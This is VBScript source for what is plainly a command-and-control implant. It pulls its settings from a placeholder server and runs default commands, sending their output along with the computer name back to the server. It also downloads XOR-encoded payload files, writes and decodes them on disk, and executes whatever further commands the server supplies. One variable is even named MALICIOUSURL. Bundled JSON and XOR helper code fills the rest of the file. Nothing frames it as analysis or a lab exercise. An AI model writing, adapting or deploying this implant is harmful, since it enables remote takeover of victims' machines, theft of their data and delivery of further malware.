Public SERVERADDRESS
SERVERADDRESS = "http://ServerIPorNDS"
Public CONFIGURATIONPATH
CONFIGURATIONPATH = "/Configuration"
Public HEADERS
HEADERS = "UUID-01"
EnKey = ""
Public COMMANDSTOEXE
Public FILES
Public DEFAULTCOMMANDSTOEXE
Public MALICIOUSURL
MALICIOUSURL = None

Dim TheJSONStringEncoder: Set TheJSONStringEncoder = New JSONStringEncoder

Function HttpGetRequest(path)
	Dim http
	Set http = CreateObject("Msxml2.ServerXMLHTTP")
	http.Open "GET", SERVERADDRESS+path , False
	http.setRequestHeader "UUID",HEADERS
	http.send
	Dim response
	If http.Status = 200 Then
		response = http.responseText
	End If
	HttpGetRequest = response
End Function

Function HttpPostRequest(path,json)
	Dim http
	Set http = CreateObject("Msxml2.ServerXMLHTTP")
	http.Open "POST", SERVERADDRESS+path, False
	http.setRequestHeader "UUID",HEADERS
	'http.setProxy 2, "192.168.3.68:8080", ""
	http.send json
	Dim response
	If http.Status = 200 Then
		response = http.responseText
	End If
	HttpPostRequest = response
End Function

Function conf()
	Dim fso, json, str, o, i
	Set json = New VbsJson
	set outputObj = json.Decode(HttpGetRequest(CONFIGURATIONPATH))
	SERVERADDRESS = "http://"+outputObj("Server")
	COMMANDSTOEXE = outputObj("Commands")
	DEFAULTCOMMANDSTOEXE = outputObj("DefaultCommands")
	FILES = outputObj("Files")
	MALICIOUSURL = SERVERADDRESS+outputObj("MaliciousPath")
End Function

Function DownloadFile(fileDown, encr)
	Dim http
	Set http = CreateObject("Msxml2.ServerXMLHTTP")
	http.Open "POST", SERVERADDRESS+"/GetAFile" , False
	http.setRequestHeader "UUID",HEADERS
	'http.setProxy 2, "127.0.0.1:8080", ""
	http.send fileDown
	Dim response(2)
	If http.Status = 200 Then
		response(0) = http.getResponseHeader("Filename")
		response(1) = http.responseBody
	End If
	HttpGetRequestVar = response

	Dim FileName,BinaryCodeToExe
	FileName = HttpGetRequestVar(0)
	If encr = 1 Then
		FileName = Filename & ".enc"
	End If

	BinaryCodeToExe = HttpGetRequestVar(1)
	'MsgBox(BinaryCodeToExe)
	Const adTypeBinary = 1
	Const adSaveCreateOverWrite = 2

	'Create Stream object
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")

	'Specify stream type - we want To save binary data.
	BinaryStream.Type = adTypeBinary

	'Open the stream And write binary data To the object
	BinaryStream.Open
	BinaryStream.Write BinaryCodeToExe

	'Save binary data To disk
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
	DownloadFile = FileName
End Function

Function RunDefaultCommand(command)
	Dim ObjExec
	Dim strFromProc
	Dim result
	Set objShell = WScript.CreateObject("WScript.Shell")
	Set ObjExec = objShell.Exec(command )
	Do
		strFromProc = ObjExec.StdOut.ReadAll()
		result = strFromProc
	Loop While Not ObjExec.Stdout.atEndOfStream
	RunDefaultCommand= result
End Function

Function RunCommand(command)
	Dim ObjExec
	Dim strFromProc
	Dim result
	Set objShell = WScript.CreateObject("WScript.Shell")
	Set ObjExec = objShell.Exec(command )
End Function

Function JsonEncodeQuotes(input)
  JsonEncodeQuotes = Replace(input & "", """", "\""")
End Function

Function PreperToSend(typ,data)
	dim js, strComputerName
	Set JSON = New JSONStringEncoder
	Set wshShell = CreateObject( "WScript.Shell" )
	strComputerName = wshShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )

	Set objDict = CreateObject("Scripting.Dictionary")
	objDict.Add "computer",strComputerName
	objDict.Add "type",typ
	objDict.Add "data",data
	PreperToSend = JSONStringify(objDict)
End Function


Function Activate()
	dim res
	res = HttpPostRequest("/Commands",PreperToSend("Activated",FormatDateTime(Now))) 'Client activate the code (flag)
	For Each command In DEFAULTCOMMANDSTOEXE 'Run the default commands and send the output to the server
		Call HttpPostRequest("/Commands",PreperToSend(command,RunDefaultCommand(command)))
	Next
	For Each file In FILES 'Download each required file from the Server (CnC) and store it
		Call DownloadFile(file,1)
		Dim arrKey, errResult
		arrKey = GetKey(HEADERS)
		errResult = Encode( CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)&"\"&file&".enc", CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)&"\"&file, arrKey )
		If errResult <> 0 Then
		ShowError errResult
End If
	Next
	For Each command In COMMANDSTOEXE 'Client execute each command
		Call RunCommand(command)
	Next
	Activate = res
End Function


Call conf()
Call Activate()


'========= JSON Parser for VBScript ===========
'http://demon.tw/my-work/vbs-json.html

Class VbsJson
    'Author: Demon
    'Date: 2012/5/3
    'Website: http://demon.tw
    Private Whitespace, NumberRegex, StringChunk
    Private b, f, r, n, t

    Private Sub Class_Initialize
        Whitespace = " " & vbTab & vbCr & vbLf
        b = ChrW(8)
        f = vbFormFeed
        r = vbCr
        n = vbLf
        t = vbTab

        Set NumberRegex = New RegExp
        NumberRegex.Pattern = "(-?(?:0|[1-9]\d*))(\.\d+)?([eE][-+]?\d+)?"
        NumberRegex.Global = False
        NumberRegex.MultiLine = True
        NumberRegex.IgnoreCase = True

        Set StringChunk = New RegExp
        StringChunk.Pattern = "([\s\S]*?)([""\\\x00-\x1f])"
        StringChunk.Global = False
        StringChunk.MultiLine = True
        StringChunk.IgnoreCase = True
    End Sub

    'Return a JSON string representation of a VBScript data structure
    'Supports the following objects and types
    '+-------------------+---------------+
    '| VBScript          | JSON          |
    '+===================+===============+
    '| Dictionary        | object        |
    '+-------------------+---------------+
    '| Array             | array         |
    '+-------------------+---------------+
    '| String            | string        |
    '+-------------------+---------------+
    '| Number            | number        |
    '+-------------------+---------------+
    '| True              | true          |
    '+-------------------+---------------+
    '| False             | false         |
    '+-------------------+---------------+
    '| Null              | null          |
    '+-------------------+---------------+
    Public Function Encode(ByRef obj)
        Dim buf, i, c, g
        Set buf = CreateObject("Scripting.Dictionary")
        Select Case VarType(obj)
            Case vbNull
                buf.Add buf.Count, "null"
            Case vbBoolean
                If obj Then
                    buf.Add buf.Count, "true"
                Else
                    buf.Add buf.Count, "false"
                End If
            Case vbInteger, vbLong, vbSingle, vbDouble
                buf.Add buf.Count, obj
            Case vbString
                buf.Add buf.Count, """"
                For i = 1 To Len(obj)
                    c = Mid(obj, i, 1)
                    Select Case c
                        Case """" buf.Add buf.Count, "\"""
                        Case "\"  buf.Add buf.Count, "\\"
                        Case "/"  buf.Add buf.Count, "/"
                        Case b    buf.Add buf.Count, "\b"
                        Case f    buf.Add buf.Count, "\f"
                        Case r    buf.Add buf.Count, "\r"
                        Case n    buf.Add buf.Count, "\n"
                        Case t    buf.Add buf.Count, "\t"
                        Case Else
                            If AscW(c) >= 0 And AscW(c) <= 31 Then
                                c = Right("0" & Hex(AscW(c)), 2)
                                buf.Add buf.Count, "\u00" & c
                            Else
                                buf.Add buf.Count, c
                            End If
                    End Select
                Next
                buf.Add buf.Count, """"
            Case vbArray + vbVariant
                g = True
                buf.Add buf.Count, "["
                For Each i In obj
                    If g Then g = False Else buf.Add buf.Count, ","
                    buf.Add buf.Count, Encode(i)
                Next
                buf.Add buf.Count, "]"
            Case vbObject
                If TypeName(obj) = "Dictionary" Then
                    g = True
                    buf.Add buf.Count, "{"
                    For Each i In obj
                        If g Then g = False Else buf.Add buf.Count, ","
                        buf.Add buf.Count, """" & i & """" & ":" & Encode(obj(i))
                    Next
                    buf.Add buf.Count, "}"
                Else
                    Err.Raise 8732,,"None dictionary object"
                End If
            Case Else
                buf.Add buf.Count, """" & CStr(obj) & """"
        End Select
        Encode = Join(buf.Items, "")
    End Function

    'Return the VBScript representation of ``str(``
    'Performs the following translations in decoding
    '+---------------+-------------------+
    '| JSON          | VBScript          |
    '+===============+===================+
    '| object        | Dictionary        |
    '+---------------+-------------------+
    '| array         | Array             |
    '+---------------+-------------------+
    '| string        | String            |
    '+---------------+-------------------+
    '| number        | Double            |
    '+---------------+-------------------+
    '| true          | True              |
    '+---------------+-------------------+
    '| false         | False             |
    '+---------------+-------------------+
    '| null          | Null              |
    '+---------------+-------------------+
    Public Function Decode(ByRef str)
        Dim idx
        idx = SkipWhitespace(str, 1)

        If Mid(str, idx, 1) = "{" Then
            Set Decode = ScanOnce(str, 1)
        Else
            Decode = ScanOnce(str, 1)
        End If
    End Function

    Private Function ScanOnce(ByRef str, ByRef idx)
        Dim c, ms

        idx = SkipWhitespace(str, idx)
        c = Mid(str, idx, 1)

        If c = "{" Then
            idx = idx + 1
            Set ScanOnce = ParseObject(str, idx)
            Exit Function
        ElseIf c = "[" Then
            idx = idx + 1
            ScanOnce = ParseArray(str, idx)
            Exit Function
        ElseIf c = """" Then
            idx = idx + 1
            ScanOnce = ParseString(str, idx)
            Exit Function
        ElseIf c = "n" And StrComp("null", Mid(str, idx, 4)) = 0 Then
            idx = idx + 4
            ScanOnce = Null
            Exit Function
        ElseIf c = "t" And StrComp("true", Mid(str, idx, 4)) = 0 Then
            idx = idx + 4
            ScanOnce = True
            Exit Function
        ElseIf c = "f" And StrComp("false", Mid(str, idx, 5)) = 0 Then
            idx = idx + 5
            ScanOnce = False
            Exit Function
        End If

        Set ms = NumberRegex.Execute(Mid(str, idx))
        If ms.Count = 1 Then
            idx = idx + ms(0).Length
            ScanOnce = CDbl(ms(0))
            Exit Function
        End If

        Err.Raise 8732,,"No JSON object could be ScanOnced"
    End Function

    Private Function ParseObject(ByRef str, ByRef idx)
        Dim c, key, value
        Set ParseObject = CreateObject("Scripting.Dictionary")
        idx = SkipWhitespace(str, idx)
        c = Mid(str, idx, 1)

        If c = "}" Then
            Exit Function
        ElseIf c <> """" Then
            Err.Raise 8732,,"Expecting property name"
        End If

        idx = idx + 1

        Do
            key = ParseString(str, idx)

            idx = SkipWhitespace(str, idx)
            If Mid(str, idx, 1) <> ":" Then
                Err.Raise 8732,,"Expecting : delimiter"
            End If

            idx = SkipWhitespace(str, idx + 1)
            If Mid(str, idx, 1) = "{" Then
                Set value = ScanOnce(str, idx)
            Else
                value = ScanOnce(str, idx)
            End If
            ParseObject.Add key, value

            idx = SkipWhitespace(str, idx)
            c = Mid(str, idx, 1)
            If c = "}" Then
                Exit Do
            ElseIf c <> "," Then
                Err.Raise 8732,,"Expecting , delimiter"
            End If

            idx = SkipWhitespace(str, idx + 1)
            c = Mid(str, idx, 1)
            If c <> """" Then
                Err.Raise 8732,,"Expecting property name"
            End If

            idx = idx + 1
        Loop

        idx = idx + 1
    End Function

    Private Function ParseArray(ByRef str, ByRef idx)
        Dim c, values, value
        Set values = CreateObject("Scripting.Dictionary")
        idx = SkipWhitespace(str, idx)
        c = Mid(str, idx, 1)

        If c = "]" Then
            ParseArray = values.Items
            Exit Function
        End If

        Do
            idx = SkipWhitespace(str, idx)
            If Mid(str, idx, 1) = "{" Then
                Set value = ScanOnce(str, idx)
            Else
                value = ScanOnce(str, idx)
            End If
            values.Add values.Count, value

            idx = SkipWhitespace(str, idx)
            c = Mid(str, idx, 1)
            If c = "]" Then
                Exit Do
            ElseIf c <> "," Then
                Err.Raise 8732,,"Expecting , delimiter"
            End If

            idx = idx + 1
        Loop

        idx = idx + 1
        ParseArray = values.Items
    End Function

    Private Function ParseString(ByRef str, ByRef idx)
        Dim chunks, content, terminator, ms, esc, char
        Set chunks = CreateObject("Scripting.Dictionary")

        Do
            Set ms = StringChunk.Execute(Mid(str, idx))
            If ms.Count = 0 Then
                Err.Raise 8732,,"Unterminated string starting"
            End If

            content = ms(0).Submatches(0)
            terminator = ms(0).Submatches(1)
            If Len(content) > 0 Then
                chunks.Add chunks.Count, content
            End If

            idx = idx + ms(0).Length

            If terminator = """" Then
                Exit Do
            ElseIf terminator <> "\" Then
                Err.Raise 8732,,"Invalid control character"
            End If

            esc = Mid(str, idx, 1)

            If esc <> "u" Then
                Select Case esc
                    Case """" char = """"
                    Case "\"  char = "\"
                    Case "/"  char = "/"
                    Case "b"  char = b
                    Case "f"  char = f
                    Case "n"  char = n
                    Case "r"  char = r
                    Case "t"  char = t
                    Case Else Err.Raise 8732,,"Invalid escape"
                End Select
                idx = idx + 1
            Else
                char = ChrW("&H" & Mid(str, idx + 1, 4))
                idx = idx + 5
            End If

            chunks.Add chunks.Count, char
        Loop

        ParseString = Join(chunks.Items, "")
    End Function

    Private Function SkipWhitespace(ByRef str, ByVal idx)
        Do While idx <= Len(str) And _
            InStr(Whitespace, Mid(str, idx, 1)) > 0
            idx = idx + 1
        Loop
        SkipWhitespace = idx
    End Function

End Class

'https://gist.github.com/atifaziz/5465514

Class JSONStringEncoder

    Private m_RegExp

    Sub Class_Initialize()
        Set m_RegExp = Nothing
    End Sub

    Function Encode(ByVal Str)

        Dim Parts(): ReDim Parts(3)
        Dim NextPartIndex: NextPartIndex = 0
        Dim AnchorIndex: AnchorIndex = 1
        Dim CharCode, Escaped
        Dim Match, MatchIndex
        Dim RegExp: Set RegExp = m_RegExp
        If RegExp Is Nothing Then
            Set RegExp = New RegExp
            ' See https://github.com/douglascrockford/JSON-js/blob/43d7836c8ec9b31a02a31ae0c400bdae04d3650d/json2.js#L196
            RegExp.Pattern = "[\\\""\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]"
            RegExp.Global = True
            Set m_RegExp = RegExp
        End If
        For Each Match In RegExp.Execute(Str)
            MatchIndex = Match.FirstIndex + 1
            If NextPartIndex > UBound(Parts) Then ReDim Preserve Parts(UBound(Parts) * 2)
            Parts(NextPartIndex) = Mid(Str, AnchorIndex, MatchIndex - AnchorIndex): NextPartIndex = NextPartIndex + 1
            CharCode = AscW(Mid(Str, MatchIndex, 1))
            Select Case CharCode
                Case 34  : Escaped = "\"""
                Case 10  : Escaped = "\n"
                Case 13  : Escaped = "\r"
                Case 92  : Escaped = "\\"
                Case 8   : Escaped = "\b"
                Case Else: Escaped = "\u" & Right("0000" & Hex(CharCode), 4)
            End Select
            If NextPartIndex > UBound(Parts) Then ReDim Preserve Parts(UBound(Parts) * 2)
            Parts(NextPartIndex) = Escaped: NextPartIndex = NextPartIndex + 1
            AnchorIndex = MatchIndex + 1
        Next
        If AnchorIndex = 1 Then Encode = """" & Str & """": Exit Function
        If NextPartIndex > UBound(Parts) Then ReDim Preserve Parts(UBound(Parts) * 2)
        Parts(NextPartIndex) = Mid(Str, AnchorIndex): NextPartIndex = NextPartIndex + 1
        ReDim Preserve Parts(NextPartIndex - 1)
        Encode = """" & Join(Parts, "") & """"

    End Function

End Class



Function EncodeJSONString(ByVal Str)
    EncodeJSONString = TheJSONStringEncoder.Encode(Str)
End Function

Function EncodeJSONMember(ByVal Key, Value)
    EncodeJSONMember = EncodeJSONString(Key) & ":" & JSONStringify(Value)
End Function

Public Function JSONStringify(Thing)

    Dim Key, Item, Index, NextIndex, Arr()
    Dim VarKind: VarKind = VarType(Thing)
    Select Case VarKind
        Case vbNull, vbEmpty: JSONStringify = "null"
        Case vbDate: JSONStringify = EncodeJSONString(FormatISODateTime(Thing))
        Case vbString: JSONStringify = EncodeJSONString(Thing)
        Case vbBoolean: If Thing Then JSONStringify = "true" Else JSONStringify = "false"
        Case vbObject
            If Thing Is Nothing Then
                JSONStringify = "null"
            Else
                If TypeName(Thing) = "Dictionary" Then
                    If Thing.Count = 0 Then JSONStringify = "{}": Exit Function
                    ReDim Arr(Thing.Count - 1)
                    Index = 0
                    For Each Key In Thing.Keys
                        Arr(Index) = EncodeJSONMember(Key, Thing(Key))
                        Index = Index + 1
                    Next
                    JSONStringify = "{" & Join(Arr, ",") & "}"
                Else
                    ReDim Arr(3)
                    NextIndex = 0
                    For Each Item In Thing
                        If NextIndex > UBound(Arr) Then ReDim Preserve Arr(UBound(Arr) * 2)
                        Arr(NextIndex) = JSONStringify(Item)
                        NextIndex = NextIndex + 1
                    Next
                    ReDim Preserve Arr(NextIndex - 1)
                    JSONStringify = "[" & Join(Arr, ",") & "]"
                End If
            End If
        Case Else
            If vbArray = (VarKind And vbArray) Then
                For Index = LBound(Thing) To UBound(Thing)
                    If Len(JSONStringify) > 0 Then JSONStringify = JSONStringify & ","
                    JSONStringify = JSONStringify & JSONStringify(Thing(Index))
                Next
                JSONStringify = "[" & JSONStringify & "]"
            ElseIf IsNumeric(Thing) Then
                JSONStringify = CStr(Thing)
            Else
                JSONStringify = EncodeJSONString(CStr(Thing))
            End If
    End Select

End Function

'=========================== Encryption =============================
'


Sub ShowError( myError )
    On Error Resume Next
    Err.Raise myError
    WScript.Echo "ERROR " & Err.Number & ": " & Err.Description
    Err.Clear
    On Error Goto 0
    WScript.Quit
End Sub


Function Encode( myFileIn, myFileOut, arrCode )
' This function provides a simple (ASCII) text encoder/decoder using XOR.
' Because it uses XOR, both encoding and decoding can be performed by the
' same function, with the same key.
'
' Arguments:
' myFileIn   [string]        input text file (file to be encoded)
' myFileOut  [string]        output file (encoded text)
' arrCode    [array of int]  "key", consisting of any number of integers
'                            from 1 to 255; avoid 0, though it can be used,
'                            it doesn't encode anything.
'                            Use any number of elements in the "key" array,
'                            each element multiplies the number of possible
'                            keys by 255 (not 256 since 0 is avoided).
'                            If only a single element is used, it may be
'                            passed either as an array or as a single integer.
'
' Return code:
' 0 if all went well, otherwise the appropriate error number.
'
' Written by Rob van der Woude
' http://www.robvanderwoude.com

    ' Standard housekeeping
    Dim i, objFSO, objFileIn, objFileOut, objStreamIn

    Const ForAppending       =  8
    Const ForReading         =  1
    Const ForWriting         =  2
    Const TristateFalse      =  0
    Const TristateMixed      = -2
    Const TristateTrue       = -1
    Const TristateUseDefault = -2

    ' Use custom error handling
    On Error Resume Next

    ' If the "key" is a single digit, convert it to an array
    If Not IsArray( arrCode ) Then
        arrCode = Array( arrCode )
    End If

    ' Check if a valid "key" array is used
    For i = 0 To UBound( arrCode )
        If Not IsNumeric( arrCode(i) ) Then
            ' 1032    Invalid character
            Encode = 1032
            Exit Function
        End If
        If arrCode(i) < 0 Or arrCode(i) > 255 Then
            ' 1031    Invalid number
            Encode = 1031
            Exit Function
        End If
    Next

    ' Open a file system object
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )

    ' Open the input file if it exists
    If objFSO.FileExists( myFileIn ) Then
        Set objFileIn   = objFSO.GetFile( myFileIn )
        Set objStreamIn = objFileIn.OpenAsTextStream( ForReading, TriStateFalse )
    Else
        ' Error 53: File not found
        Encode = 53
        ' Close input file and release objects
        objStreamIn.Close
        Set objStreamIn = Nothing
        Set objFileIn   = Nothing
        Set objFSO      = Nothing
        ' Abort
        Exit Function
    End If

    ' Create the output file, unless it already exists
    If objFSO.FileExists( myFileOut ) Then
        ' Error 58: File already exists
        Encode = 58
        ' Close input file and release objects
        objStreamIn.Close
        Set objStreamIn = Nothing
        Set objFileIn   = Nothing
        Set objFSO      = Nothing
        ' Abort
        Exit Function
    Else
        Set objFileOut = objFSO.CreateTextFile( myFileOut, True, False )
    End If

    ' Encode the text from the input file and write it to the output file
    i = 0
    Do Until objStreamIn.AtEndOfStream
        i = ( i + 1 ) \ ( UBound( arrCode ) + 1 )
        objFileOut.Write Chr( Asc( objStreamIn.Read( 1 ) ) Xor arrCode(i) )
    Loop

    ' Close files and release objects
    objFileOut.Close
    objStreamIn.Close
    Set objStreamIn = Nothing
    Set objFileIn   = Nothing
    Set objFileOut  = Nothing
    Set objFSO      = Nothing

    ' Return the error number as status information
    Encode = Err.Number

    ' Done
    Err.Clear
    On Error Goto 0
End Function


Function GetKey( myPassPhrase )
' This function converts a password or passphrase
' into a "key" array for the Encode function.
    Dim i, arrCode( )
    ReDim arrCode( Len( myPassPhrase ) - 1 )
    For i = 0 To UBound( arrCode )
        arrCode(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )
    Next
    GetKey = arrCode
End Function
